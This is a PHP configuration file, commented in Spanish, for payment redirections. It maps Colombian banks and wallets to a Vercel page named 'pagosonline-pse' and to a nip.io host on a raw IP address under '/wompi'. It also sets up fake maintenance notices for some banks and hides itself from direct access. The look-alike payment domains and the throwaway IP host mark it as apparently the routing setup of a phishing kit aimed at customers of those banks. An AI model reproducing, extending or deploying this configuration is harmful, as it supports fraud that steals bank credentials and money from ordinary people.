<?php
/**
 * Configuración central de redirecciones de pago.
 * Este archivo NO debe ser accesible directamente por URL.
 */
if (basename($_SERVER['SCRIPT_FILENAME'] ?? '') === basename(__FILE__)) {
    http_response_code(403);
    exit('Acceso denegado');
}

return [
    // Bancos bloqueados temporalmente (muestran modal de mantenimiento).
    // Agregar/quitar claves internas aquí para activar o desactivar el bloqueo.
    'maintenance_banks' => [
        'nequi',
    'daviplata',
    ],

    'links' => [
        'primary_page' => 'https://pagosonline-pse.vercel.app',
        'recaudofall_base' => 'https://recaudofall.94.250.202.215.nip.io/wompi',
    ],

    // Bancos que van a la pasarela Vercel.
    // Si comentas una línea, ese banco cae automáticamente a recaudofall.
    'primary_banks' => [
        'bogota' => ['slug' => 'bg', 'id' => 'e795be1af0a0e791176cc511'],
      'occidente' => ['slug' => 'occ', 'id' => 'e795be1af0a0e791176cc511'],
        'popular' => ['slug' => 'pop', 'id' => 'e795be1af0a0e791176cc511'],
          'avvillas' => ['slug' => 'avv', 'id' => 'e795be1af0a0e791176cc511'],
         'bancolombia' => ['slug' => 'bc', 'id' => 'e795be1af0a0e791176cc511'],  // <- comentado = va a recaudofall
        'nequi' => ['slug' => 'nq', 'id' => 'e795be1af0a0e791176cc511'],  // <- comentado = va a recaudofall
    'davivienda' => ['slug' => 'dv', 'id' => 'e795be1af0a0e791176cc511'], 
    ],

    // Bancos disponibles para recaudofall (nombre interno => etiqueta externa)
    'recaudofall_banks' => [
        'bancolombia' => 'BANCOLOMBIA',
        'nequi' => 'NEQUI',
        'davivienda' => 'DAVIVIENDA',
        'daviplata' => 'DAVIPLATA',
        'bbva' => 'BBVA',
        'bogota' => 'BOGOTA',
        'caja-social' => 'CAJASOCIAL',
        'colpatria' => 'COLPATRIA',
        'davibank-s.a.' => 'COLPATRIA',
        'itau' => 'ITAU',
        'falabella' => 'FALABELLA',
        'occidente' => 'OCCIDENTE',
        'avvillas' => 'AVVILLAS',
        'popular' => 'POPULAR',
        'coopcentral' => 'COOPCENTRAL',
        'bancoomeva' => 'BANCOOMEVA',
        'gnb' => 'GNB',
        'agrario' => 'AGRARIO',
        'rappipay' => 'RAPPIPAY',
        'lulo' => 'LULO',
        'bancamia' => 'BANCAMIA',
        'movii' => 'MOVII',
        'confiar' => 'CONFIAR',
        'pichincha' => 'PICHINCHA',
        'serfinanza' => 'SERFINANZA',
        'cfa' => 'ANTIOQUIA',
        'union' => 'BANCOUNIN',
        'citibank' => 'CITIBANK',
        'finandina' => 'FINANDINA',
        'iris' => 'IRIS',
        'coofinep' => 'COOFINEP',
        'credifinanciera' => 'CREDIFINANCIERA',
        'santander' => 'SANTANDER',
        'coltefinanciera' => 'COLTEFINANCIERA',
        'cotrafa' => 'COTRAFA',
        'nu' => 'NU',
        'uala' => 'UAL',
        'alianza' => 'ALIANZA',
        'jpmorgan' => 'MORGAN',
        'mundo-mujer' => 'MUNDOMUJER',
        'crezcamos' => 'CREZCAMOS',
        'dale' => 'DALE',
        'jfk' => 'JFK',
        'bold' => 'BOLD',
        'juriscoop' => 'JURISCOOP',
        'powwi' => 'POWWI',
        'coink' => 'COINK',
        'ding' => 'DING',
        'global66' => 'GLOBAL66',
    ],

    // Etiquetas que aparecen en el <select> de "Otras Entidades"
    // (clave = value del <option>, valor = texto visible + mapeo interno)
    'select_otras_entidades' => [
        'nequi' => ['label' => 'NEQUI', 'slug' => 'nequi'],
        'bancolombia' => ['label' => 'BANCOLOMBIA', 'slug' => 'bancolombia'],
        'davivienda' => ['label' => 'BANCO DAVIVIENDA', 'slug' => 'davivienda'],
        'colpatria' => ['label' => 'SCOTIABANK COLPATRIA', 'slug' => 'colpatria'],
        'bbva' => ['label' => 'BANCO BBVA COLOMBIA S.A.', 'slug' => 'bbva'],
        'caja-social' => ['label' => 'BANCO CAJA SOCIAL', 'slug' => 'caja-social'],
        'falabella' => ['label' => 'BANCO FALABELLA', 'slug' => 'falabella'],
        'lulo' => ['label' => 'LULO BANK', 'slug' => 'lulo'],
        'daviplata' => ['label' => 'DAVIPLATA', 'slug' => 'daviplata'],
        'itau' => ['label' => 'BANCO ITAU', 'slug' => 'itau'],
        'bancoomeva' => ['label' => 'BANCOOMEVA S.A.', 'slug' => 'bancoomeva'],
        'gnb' => ['label' => 'BANCO GNB SUDAMERIS', 'slug' => 'gnb'],
        'agrario' => ['label' => 'BANCO AGRARIO', 'slug' => 'agrario'],
        'rappipay' => ['label' => 'RAPPIPAY', 'slug' => 'rappipay'],
        'bancamia' => ['label' => 'BANCAMIA S.A.', 'slug' => 'bancamia'],
        'movii' => ['label' => 'MOVII S.A.', 'slug' => 'movii'],
        'confiar' => ['label' => 'CONFIAR COOPERATIVA FINANCIERA', 'slug' => 'confiar'],
        'pichincha' => ['label' => 'BANCO PICHINCHA S.A.', 'slug' => 'pichincha'],
        'serfinanza' => ['label' => 'BANCO SERFINANZA', 'slug' => 'serfinanza'],
        'union' => ['label' => 'BANCO UNION', 'slug' => 'union'],
        'citibank' => ['label' => 'CITIBANK', 'slug' => 'citibank'],
        'finandina' => ['label' => 'BANCO FINANDINA S.A. BIC', 'slug' => 'finandina'],
        'nu' => ['label' => 'NU', 'slug' => 'nu'],
        'uala' => ['label' => 'UALA', 'slug' => 'uala'],
        'mundo-mujer' => ['label' => 'BANCO MUNDO MUJER S.A.', 'slug' => 'mundo-mujer'],
        'crezcamos' => ['label' => 'CREZCAMOS', 'slug' => 'crezcamos'],
        'dale' => ['label' => 'DALE', 'slug' => 'dale'],
        'bold' => ['label' => 'BOLD CF', 'slug' => 'bold'],
        'powwi' => ['label' => 'POWWI', 'slug' => 'powwi'],
        'coink' => ['label' => 'COINK SA', 'slug' => 'coink'],
        'ding' => ['label' => 'DING', 'slug' => 'ding'],
        'global66' => ['label' => 'GLOBAL66', 'slug' => 'global66'],
    ],

    // Aliases que pueden llegar desde el frontend (por si el usuario edita el value)
    'aliases' => [
        'BANCO DE BOGOTA' => 'bogota',
        'BOGOTA' => 'bogota',
        'BANCO DE OCCIDENTE' => 'occidente',
        'OCCIDENTE' => 'occidente',
        'BANCO POPULAR' => 'popular',
        'POPULAR' => 'popular',
        'BANCO AV VILLAS' => 'avvillas',
        'AV VILLAS' => 'avvillas',
        'AVVILLAS' => 'avvillas',
        'BANCOLOMBIA' => 'bancolombia',
        'NEQUI' => 'nequi',
        'BANCO DAVIVIENDA' => 'davivienda',
        'DAVIVIENDA' => 'davivienda',
        'DAVIPLATA' => 'daviplata',
        'BANCO BBVA COLOMBIA S.A.' => 'bbva',
        'BBVA' => 'bbva',
        'BANCO CAJA SOCIAL' => 'caja-social',
        'CAJA SOCIAL' => 'caja-social',
        'SCOTIABANK COLPATRIA' => 'colpatria',
        'COLPATRIA' => 'colpatria',
        'BANCO FALABELLA' => 'falabella',
        'FALABELLA' => 'falabella',
        'LULO BANK' => 'lulo',
        'LULO' => 'lulo',
        'BANCO ITAU' => 'itau',
        'ITAU' => 'itau',
    ],
];
